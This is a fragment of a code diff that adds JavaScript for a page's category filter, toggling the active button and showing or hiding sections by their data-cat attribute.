+      buttons.forEach(b => b.classList.remove('active'))
+      btn.classList.add('active')
+
+      sections.forEach(s => {
+        if (filter === 'all' || s.getAttribute('data-cat') === filter) {
+          s.style.display = 'block'
+        } else {
+          s.style.display = 'none'
+        }
+      })
+    })
+  })
+</script>
